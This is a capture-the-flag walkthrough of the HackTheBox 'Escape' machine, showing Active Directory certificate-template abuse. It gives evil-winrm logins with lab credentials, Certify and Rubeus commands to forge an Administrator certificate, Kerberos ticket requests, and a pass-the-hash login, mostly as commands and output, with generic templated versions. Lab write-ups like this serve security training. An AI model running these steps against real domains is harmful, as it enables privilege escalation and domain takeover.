## HackTheBox
- `Escape` machine:
https://app.hackthebox.com/machines/Escape

- Requirements:
	1. Ryan Cooper's credentials:  `Ryan.Cooper:NuclearMosquito3` 
	2. `Certify.exe` binary - can be obtained from [GhostPack Certify.exe compiled binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe)
	3. `Rubeus.exe` binary - can be obtained from [GhostPack Rubeus.exe compiled binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

- AD certificate templates can be abused when the following three conditions are satisfied:
	1. `msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT` field is present
	2. `pkiextendedkeyusage: Client Authentication` field is present
	3. `Enrollment Rights: NT Authority\Authenticated Users` field is present

- For more details:
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin

---
1. After getting `Ryan.Cooper`'s password, login with `evil-winrm`:
	```sh
	kali@kali$ evil-winrm -i $ip -u 'Ryan.Cooper' -p 'NuclearMosquito3'
	```

2. Upload the `Certify.exe` and `Rubeus.exe` binaries:
	```powershell
	cd C:\Users\Ryan.Cooper\Downloads
	upload Certify.exe
	upload Rubeus.exe
	```

3. Find vulnerable AD certificate templates:
	```powershell
	.\Certify.exe find /vulnerable /quiet
	```
- Output:
	```powershell
	[*] Action: Find certificate templates
	[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
	
	[*] Listing info about the Enterprise CA 'sequel-DC-CA'
	
	    Enterprise CA Name            : sequel-DC-CA
	    DNS Hostname                  : dc.sequel.htb
	    FullName                      : dc.sequel.htb\sequel-DC-CA
	    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
	    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
	    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
	    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
	    Cert Start Date               : 11/18/2022 12:58:46 PM
	    Cert End Date                 : 11/18/2121 1:08:46 PM
	    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
	    UserSpecifiedSAN              : Disabled
	    CA Permissions                :
	      Owner: BUILTIN\Administrators        S-1-5-32-544
	
	      Access Rights                                     Principal
	
	      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11         <<---<<["CONDITION 3"]
	      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
	      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
	      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
	    Enrollment Agent Restrictions : None
	
	[!] Vulnerable Certificates Templates :
	
	    CA Name                               : dc.sequel.htb\sequel-DC-CA
	    Template Name                         : UserAuthentication
	    Schema Version                        : 2
	    Validity Period                       : 10 years
	    Renewal Period                        : 6 weeks
	    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT                                     <<---<<["CONDITION 1"]
	    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
	    Authorized Signatures Required        : 0                                                            
	    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email  <<---<<["CONDITION 2"]
	    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
	    Permissions
	      Enrollment Permissions
	        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
	                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
	                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
	      Object Control Permissions
	        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
	        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
	                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
	                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
	        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
	                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
	                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
	        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
	                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
	                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
		
	Certify completed in 00:00:10.1816077
	```

4. Request a new certificate on behalf of the domain administrator:
	```powershell
	.\Certify.exe request /quiet /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
	```
	```powershell
	.\Certify.exe request /quiet /ca:<$certificateAuthorityHost> /template:<$vulnerableCertificateTemplateName> /altname:<$adUserToImpersonate>
	.\Certify.exe request /quiet /ca:<$CA_Name> /template:<$Template_Name> /altname:<$adUserToImpersonate> # from Vulnerable Certificates Templates fields
	```
- Output:
	```powershell
	[*] Action: Request a Certificates
	
	[*] Current user context    : sequel\Ryan.Cooper
	[*] No subject name specified, using current context as subject.
	
	[*] Template                : UserAuthentication
	[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
	[*] AltName                 : Administrator
	
	[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
	
	[*] CA Response             : The certificate had been issued.
	[*] Request ID              : 10
	
	[*] cert.pem         :
	
	-----BEGIN RSA PRIVATE KEY-----
	MIIEowIBAAKCAQEA3RAMt1j/yCC+ilRKzqP2CZK5gAwGSJudvsU5wEkOSElbLXDy
	...[SNIPPED]
	dRahXNmN+sGYpZVKvoqp1HEwGDE8uMNlStvtDR1cTTHG/OFK4PRk
	-----END RSA PRIVATE KEY-----
	-----BEGIN CERTIFICATE-----
	MIIGEjCCBPqgAwIBAgITHgAAAAq1q4RHBM19kAAAAAAACjANBgkqhkiG9w0BAQsF
	...[SNIPPED]
	7LRnb41CuAW63iikV/Sl5fFGgP8RTw==
	-----END CERTIFICATE-----
	
	[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	
	Certify completed in 00:00:12.6966006
	```

5. Copy and paste the `PRIVATE KEY` into `cert.pem`, **leave one line of blank space**, copy and paste the `CERTIFICATE` into `cert.pem`, and **finally leave one line of blank space**, like so:
	```txt
	-----BEGIN CERTIFICATE-----
	MIIGEjCCBPqgAwIBAgITHgAAAAq1q4RHBM19kAAAAAAACjANBgkqhkiG9w0BAQsF
	...[SNIPPED]
	7LRnb41CuAW63iikV/Sl5fFGgP8RTw==
	-----END CERTIFICATE-----
	
	-----BEGIN RSA PRIVATE KEY-----
	MIIEowIBAAKCAQEA3RAMt1j/yCC+ilRKzqP2CZK5gAwGSJudvsU5wEkOSElbLXDy
	...[SNIPPED]
	dRahXNmN+sGYpZVKvoqp1HEwGDE8uMNlStvtDR1cTTHG/OFK4PRk
	-----END RSA PRIVATE KEY-----
	
	```

6. On the attacker machine, convert the `cert.pem` to `cert.pfx` with (specify an optional password or leave blank):
	```sh
	kali@kali$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	Enter Export Password: Str0ngpaSS135&
	Verifying - Enter Export Password: Str0ngpaSS135&
	```

7. Upload the `cert.pfx` key to the victim machine (connected with `evil-winrm`):
	```powershell
	upload cert.pfx
	```

8. Request a Kerberos TGT and inject it into memory (check cached ticket with `klist`), or request the NTLM hash to authenticate from the attacker machine:
	```powershell
	.\Rubeus.exe asktgt /user:Administrator /password:"Str0ngpaSS135&" /certificate:cert.pfx /getcredentials
	```
	```powershell
	.\Rubeus.exe asktgt /user:<$adUserToImpersonate> /password:<$optionalPassword> /certificate:cert.pfx /ptt
	.\Rubeus.exe asktgt /user:<$adUserToImpersonate> /password:<$optionalPassword> /certificate:cert.pfx /getcredentials
	```
- Output:
	```powershell
	[*] Action: Ask TGT
	
	[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
	[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
	[*] Using domain controller: fe80::1d36:a5b6:2677:7e02%4:88
	[+] TGT request successful!
	[*] base64(ticket.kirbi):
	
	      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
		  ...[SNIPPED]
	      MjkzMlqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==
	
	  ServiceName              :  krbtgt/sequel.htb
	  ServiceRealm             :  SEQUEL.HTB
	  UserName                 :  Administrator
	  UserRealm                :  SEQUEL.HTB
	  StartTime                :  6/14/2023 7:29:32 AM
	  EndTime                  :  6/14/2023 5:29:32 PM
	  RenewTill                :  6/21/2023 7:29:32 AM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable
	  KeyType                  :  rc4_hmac
	  Base64(key)              :  Gj/qqR1kQcOkqzRL6BzSPg==
	  ASREP (key)              :  1C38B3FB11E2C60F03EE798E33805FC5
	
	[*] Getting credentials using U2U
	
	  CredentialInfo         :
	    Version              : 0
	    EncryptionType       : rc4_hmac
	    CredentialData       :
	      CredentialCount    : 1
	       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE  <<---<<['HASH TO AUTHENTICATE WITH']
	```

- Confirm `Administrator` ticket is cached:
	```powershell
	*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> klist
	
	Current LogonId is 0:0xa82ab
	
	Cached Tickets: (1)
	
	#0>	Client: Administrator @ SEQUEL.HTB
		Server: krbtgt/sequel.htb @ SEQUEL.HTB
		KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		Ticket Flags 0xe10000 -> renewable initial pre_authent name_canonicalize
		Start Time: 6/14/2023 7:26:22 (local)
		End Time:   6/14/2023 17:26:22 (local)
		Renew Time: 6/21/2023 7:26:22 (local)
		Session Key Type: RSADSI RC4-HMAC(NT)
		Cache Flags: 0x1 -> PRIMARY
		Kdc Called:
	```

9. Login to `Administrator` with `evil-winrm` by specifying the NTLM hash:
	```sh
	kali@kali$ evil-winrm -i $ip -u 'Administrator' -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
	```

---

## TryHackMe
- Rooms:
https://tryhackme.com/room/adcertificatetemplates
https://tryhackme.com/room/cve202226923

- Article for **AD Certificate Templates** room:
https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366
